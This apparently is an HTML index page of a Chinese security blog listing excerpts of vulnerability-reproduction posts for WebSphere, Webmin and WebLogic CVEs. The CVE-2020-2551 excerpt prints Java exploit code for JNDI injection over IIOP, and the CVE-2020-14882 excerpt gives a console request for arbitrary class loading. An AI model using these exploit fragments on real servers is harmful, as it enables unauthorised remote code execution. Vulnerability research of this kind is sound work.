@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/26/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-WebSphere/CVE-2020-4450 IBM WebSphere IIOP协议远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/WebSphere/CVE-2020-4450%20IBM%20WebSphere%20IIOP%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.952Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CVE-2020-4450-IBM-WebSphere-IIOP协议远程代码执行漏洞"><a href="#CVE-2020-4450-IBM-WebSphere-IIOP协议远程代码执行漏洞" class="headerlink" title="CVE-2020-4450 IBM WebSphere IIOP协议远程代码执行漏洞"></a>CVE-2020-4450 IBM WebSphere IIOP协议远程代码执行漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>IBM® WebSphere® Application Server 是一种高性能的 Java 应用服务器，可用于构建、运行、集成、保护和管理内部部署和/或外部部署的动态云和 Web 应用。2020年6月IBM官方发布了 WebSphere远程代码执行 的风险通告，该漏洞编号为 CVE-2020-4450，攻击者可构造特殊的iiop数据包发送至WebSphere服务器默认的2809和9100端口，来执行任意代码和命令并接管服务器，漏洞影响版本范围为9.0.0.0 - 9.0.5.4、8.5.0.0 - 8.5.5.17、8.0.0.0 - 8.0.0.15、7.0.0.0 - 7.0.0.45</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/WebSphere/CVE-2020-4450%20IBM%20WebSphere%20IIOP%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/WebSphere/CVE-2020-4450%20IBM%20WebSphere%20IIOP%E5%8D%8F%E8%AE%AE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qxph00l6y8v1ae259dkf" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-WebSphere/CVE-2020-4276 4362 IBM WebSphere远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/WebSphere/CVE-2020-4276%204362%20IBM%20WebSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.948Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CVE-2020-4276-4362-IBM-WebSphere远程代码执行漏洞"><a href="#CVE-2020-4276-4362-IBM-WebSphere远程代码执行漏洞" class="headerlink" title="CVE-2020-4276 4362 IBM WebSphere远程代码执行漏洞"></a>CVE-2020-4276 4362 IBM WebSphere远程代码执行漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>WebSphere SOAP Connector 是什么服务？</strong></p>
+<p>WebSphere SOAP Connector 服务用于管理远程节点和数据同步，因此主要是在服务器与服务器之间进行通信。它的默认监听地址为 0.0.0.0:8880。</p>
+<p>CVE-2020-4276 和 CVE-2020-4362 漏洞编号的由来？</p>
+<p>长亭科技于今年一月份的时候向 IBM 官方报告了此漏洞，随后官方确认了漏洞，发布对应的补丁 PH21511，分配漏洞编号 CVE-2020-4276。但我们马上发现补丁 PH21511 似乎并未起到漏洞修复的效果，于是再次与官方沟通，经过最终确认后，官方再次发布补丁 PH23853，分配漏洞编号 CVE-2020-4362。因此这两个 CVE 编号，实际上是同一个漏洞。</p>
+<p>远程且未经授权的攻击者通过成功利用此漏洞，可以在目标服务端执行任意恶意代码，获取系统权限。</p>
+<p>哪些版本的 WebSphere 受到 CVE-2020-4276、CVE-2020-4362 漏洞影响？</p>
+<p>• WebSphere Application Server 9.0.x<br>• WebSphere Application Server 8.5.x<br>• WebSphere Application Server 8.0.x<br>• WebSphere Application Server 7.0.x</p>
+<p>什么情况下的WebSphere可以被 CVE-2020-4276、CVE-2020-4362 漏洞利用？</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/WebSphere/CVE-2020-4276%204362%20IBM%20WebSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/WebSphere/CVE-2020-4276%204362%20IBM%20WebSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qxpf00l5y8v174c78hr0" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Webmin/（CVE-2019-15107）Webmin 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Webmin/%EF%BC%88CVE-2019-15107%EF%BC%89Webmin%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.926Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-15107）Webmin-远程命令执行漏洞"><a href="#（CVE-2019-15107）Webmin-远程命令执行漏洞" class="headerlink" title="（CVE-2019-15107）Webmin 远程命令执行漏洞"></a>（CVE-2019-15107）Webmin 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Webmin是一个用于管理类Unix系统的管理配置工具，具有Web页面。在其找回密码页面中，存在一处无需权限的命令注入漏洞，通过这个漏洞攻击者即可以执行任意系统命令。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Webmin &lt;= 1.920</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>执行如下命令，启动webmin 1.910：</p>
+<pre><code>docker-compose up -d
+</code></pre>
+<p>执行完成后，访问<a href="https://0-sec.org:10000，忽略证书后即可看到webmin的登录页面。">https://0-sec.org:10000，忽略证书后即可看到webmin的登录页面。</a></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Webmin/%EF%BC%88CVE-2019-15107%EF%BC%89Webmin%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Webmin/%EF%BC%88CVE-2019-15107%EF%BC%89Webmin%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qxs600l7y8v18hjkdyjj" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Weblogic/（CVE-2020-2883）Weblogic 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Weblogic/%EF%BC%88CVE-2020-2883%EF%BC%89Weblogic%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.617Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-2883）Weblogic-远程代码执行漏洞"><a href="#（CVE-2020-2883）Weblogic-远程代码执行漏洞" class="headerlink" title="（CVE-2020-2883）Weblogic 远程代码执行漏洞"></a>（CVE-2020-2883）Weblogic 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>WebLogic 10.3.6.0.0</p>
+<p>WebLogic 12.1.3.0.0</p>
+<p>WebLogic 12.2.1.3.0</p>
+<p>WebLogic 12.2.1.4.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="WebLogic-10-3-6-0-0-WebLogic-12-1-3-0-0-WebLogic-12-2-1-4-0"><a href="#WebLogic-10-3-6-0-0-WebLogic-12-1-3-0-0-WebLogic-12-2-1-4-0" class="headerlink" title="WebLogic 10.3.6.0.0 WebLogic 12.1.3.0.0 WebLogic 12.2.1.4.0"></a>WebLogic 10.3.6.0.0 WebLogic 12.1.3.0.0 WebLogic 12.2.1.4.0</h3><blockquote>
+<p>先下载框架</p>
+</blockquote>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Weblogic/%EF%BC%88CVE-2020-2883%EF%BC%89Weblogic%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Weblogic/%EF%BC%88CVE-2020-2883%EF%BC%89Weblogic%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qxmm00l4y8v19deq5g7x" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Weblogic/（CVE-2020-2555）Oracle Coherence&amp;Weblogic 反序列化远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Weblogic/%EF%BC%88CVE-2020-2555%EF%BC%89Oracle%20Coherence&Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.614Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-2555）Oracle-Coherence-amp-Weblogic-反序列化远程代码执行漏洞"><a href="#（CVE-2020-2555）Oracle-Coherence-amp-Weblogic-反序列化远程代码执行漏洞" class="headerlink" title="（CVE-2020-2555）Oracle Coherence&amp;Weblogic 反序列化远程代码执行漏洞"></a>（CVE-2020-2555）Oracle Coherence&amp;Weblogic 反序列化远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该反序列化的gadget存在与coherence包中。具体可以见分析</p>
+<p>构造chain类似于common-collection的chain，可以照葫芦画瓢。</p>
+<p>mvn 好像不能下载coherence包，很奇怪，直接下jar包就行。</p>
+<p>反序列化的对象，通过t3发送给Weblogic即可。所以，这个只是生成payload的工具</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><ul>
+<li>  Oracle Coherence 3.7.1.17</li>
+<li>  Oracle Coherence 12.1.3.0.0</li>
+<li>  Oracle Coherence 12.2.1.3.0</li>
+<li>  Oracle Coherence 12.2.1.4.0</li>
+</ul>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Weblogic/%EF%BC%88CVE-2020-2555%EF%BC%89Oracle%20Coherence&Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Weblogic/%EF%BC%88CVE-2020-2555%EF%BC%89Oracle%20Coherence&Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qxmk00l2y8v1a5w735dm" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Weblogic/（CVE-2020-2551）Weblogic CVE-2020-2551 IIOP协议反序列化rce" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Weblogic/%EF%BC%88CVE-2020-2551%EF%BC%89Weblogic%20CVE-2020-2551%20IIOP%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.611Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="（CVE-2020-2551）Weblogic-CVE-2020-2551-IIOP协议反序列化rce"><a href="#（CVE-2020-2551）Weblogic-CVE-2020-2551-IIOP协议反序列化rce" class="headerlink" title="（CVE-2020-2551）Weblogic CVE-2020-2551 IIOP协议反序列化rce"></a>（CVE-2020-2551）Weblogic CVE-2020-2551 IIOP协议反序列化rce</h2><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>现在我们来看这个漏洞。IIOP传输的过程中会自动序列化和反序列化，那么我们可以通过向服务器7001端口发送一个恶意的序列化对象，IIOP达到RCE。</p>
+<p>发送恶意序列化对象的过程，其实就是bind的过程，由此我们可以构造请求</p>
+<pre><code>Hashtable&lt;String, String&gt; env = new Hashtable&lt;String, String&gt;();
+// add wlsserver/server/lib/weblogic.jar to classpath,else will error.
+env.put(&quot;java.naming.factory.initial&quot;, &quot;weblogic.jndi.WLInitialContextFactory&quot;);
+env.put(&quot;java.naming.provider.url&quot;, rhost);
+Context context = new InitialContext(env);
+// get Object to Deserialize
+JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
+jtaTransactionManager.setUserTransactionName(rmiurl);
+
+Remote remote = createMemoitizedProxy(createMap(&quot;pwned&quot;+System.nanoTime(), jtaTransactionManager), Remote.class);
+context.rebind(&quot;Y4er&quot;+System.nanoTime(), remote);
+Hashtable&lt;String, String&gt; env = new Hashtable&lt;String, String&gt;();
+// add wlsserver/server/lib/weblogic.jar to classpath,else will error.
+env.put(&quot;java.naming.factory.initial&quot;, &quot;weblogic.jndi.WLInitialContextFactory&quot;);
+env.put(&quot;java.naming.provider.url&quot;, rhost);
+Context context = new InitialContext(env);
+// get Object to Deserialize
+JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
+jtaTransactionManager.setUserTransactionName(rmiurl);
+
+Remote remote = createMemoitizedProxy(createMap(&quot;pwned&quot;+System.nanoTime(), jtaTransactionManager), Remote.class);
+context.rebind(&quot;Y4er&quot;+System.nanoTime(), remote);
+</code></pre>
+<p>你肯定疑惑<strong>JtaTransactionManager</strong>和<strong>weblogic.jndi.WLInitialContextFactory</strong>是从哪来的？</p>
+<ol>
+<li> JtaTransactionManager是spring爆出的一个可以JNDI注入的类，在weblogic中也存在。</li>
+<li> weblogic.jndi.WLInitialContextFactory 是weblogic的JNDI工厂类。</li>
+</ol>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Weblogic/%EF%BC%88CVE-2020-2551%EF%BC%89Weblogic%20CVE-2020-2551%20IIOP%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Weblogic/%EF%BC%88CVE-2020-2551%EF%BC%89Weblogic%20CVE-2020-2551%20IIOP%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/" data-id="cl5c2qxmj00l0y8v16esh2qxu" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Weblogic/（CVE-2020-14882） weblogic 未授权命令执行" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Weblogic/%EF%BC%88CVE-2020-14882%EF%BC%89%20weblogic%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.609Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CVE-2020-14882-weblogic-未授权命令执行"><a href="#CVE-2020-14882-weblogic-未授权命令执行" class="headerlink" title="CVE-2020-14882 weblogic 未授权命令执行"></a>CVE-2020-14882 weblogic 未授权命令执行</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h2><p>未经身份验证的远程攻击者可能通过构造特殊的 HTTP GET请求，利用该漏洞在受影响的 WebLogic Server 上执行任意代码。它们均存在于WebLogic的Console控制台组件中。此组件为WebLogic全版本默认自带组件，且该漏洞通过HTTP协议进行利用。将CVE-2020-14882和CVE-2020-14883进行组合利用后，远程且未经授权的攻击者可以直接在服务端执行任意代码，获取系统权限。</p>
+<p>![img](/resource/%EF%BC%88CVE-2020-14882%EF%BC%89%20weblogic%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/640-20201028223454813.png)</p>
+<p>根据补丁diff结果我们可以看出，可以看出上面的变化</p>
+<p>我们可以通过下面的代码，任意加载某个类或者对象</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;target&gt;/console/console.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=java.lang.String(&quot;ahihi&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>![img](/resource/%EF%BC%88CVE-2020-14882%EF%BC%89%20weblogic%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/640-20201028223454970.png)</p>
+<h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a><strong>未授权访问</strong></h2><p>![img](/resource/%EF%BC%88CVE-2020-14882%EF%BC%89%20weblogic%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/media/640-20201028223452474.png)</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Weblogic/%EF%BC%88CVE-2020-14882%EF%BC%89%20weblogic%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Weblogic/%EF%BC%88CVE-2020-14882%EF%BC%89%20weblogic%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="cl5c2qxmk00l1y8v1e94s0p5y" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Weblogic/（CVE-2020-14825）Weblogic反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Weblogic/%EF%BC%88CVE-2020-14825%EF%BC%89Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.607Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2020-14825）Weblogic反序列化漏洞"><a href="#（CVE-2020-14825）Weblogic反序列化漏洞" class="headerlink" title="（CVE-2020-14825）Weblogic反序列化漏洞"></a>（CVE-2020-14825）Weblogic反序列化漏洞</h1><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Weblogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JavaEE架构的中间件，Weblogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。</p>
+<h2 id="0x02-漏洞概述"><a href="#0x02-漏洞概述" class="headerlink" title="0x02 漏洞概述"></a>0x02 漏洞概述</h2><p> <strong>漏洞编号CVE-2020-14825</strong></p>
+<p>Oracle官方在2020年10月份发布的最新安全补丁中修复了许多安全漏洞，其中黑名单类oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor可造成反序列化漏洞。该漏洞允许未经身份验证的攻击者通过IIOP，T3进行网络访问，未经身份验证的攻击者成功利用此漏洞可能接管Oracle Weblogic Server。</p>
+<h2 id="0x03-影响版本"><a href="#0x03-影响版本" class="headerlink" title="0x03 影响版本"></a>0x03 影响版本</h2><p>Oracle WebLogic Server 12.2.1.3.0</p>
+<p>Oracle WebLogic Server 12.2.1.4.0</p>
+<p>Oracle WebLogic Server 14.1.1.0.0</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Weblogic/%EF%BC%88CVE-2020-14825%EF%BC%89Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Weblogic/%EF%BC%88CVE-2020-14825%EF%BC%89Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qxml00l3y8v1c2y54kdn" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Weblogic/（CVE-2019-2890）Weblogic反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Weblogic/%EF%BC%88CVE-2019-2890%EF%BC%89Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.604Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-2890）-Weblogic-T3-Analysis"><a href="#（CVE-2019-2890）-Weblogic-T3-Analysis" class="headerlink" title="（CVE-2019-2890） Weblogic T3 Analysis"></a>（CVE-2019-2890） Weblogic T3 Analysis</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>WebLogic Server 10.3.6.0</p>
+<p>WebLogic Server 12.1.3.0</p>
+<p>WebLogic Server 12.2.1.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/CVE-2019-2890">https://github.com/ianxtianxt/CVE-2019-2890</a></p>
+<h3 id="1-导入jar"><a href="#1-导入jar" class="headerlink" title="1.导入jar"></a>1.导入jar</h3><p>网上有两篇文章都说了这么个构造思路，但是我阅读学习的时候，死在了导入jar这个难题下，因此在漏洞利用的开头，我列出几个jar文件，测试环境<br>weblogic 10.3.6 ，可能weblogic 12 jar名字有所不同。</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Weblogic/%EF%BC%88CVE-2019-2890%EF%BC%89Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Weblogic/%EF%BC%88CVE-2019-2890%EF%BC%89Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qxmh00kzy8v199u9bfy2" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-Weblogic/（CVE-2019-2888）Weblogic EJBTaglibDescriptor XXE漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Weblogic/%EF%BC%88CVE-2019-2888%EF%BC%89Weblogic%20EJBTaglibDescriptor%20XXE%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:06.601Z" itemprop="datePublished">2022-07-07</time>
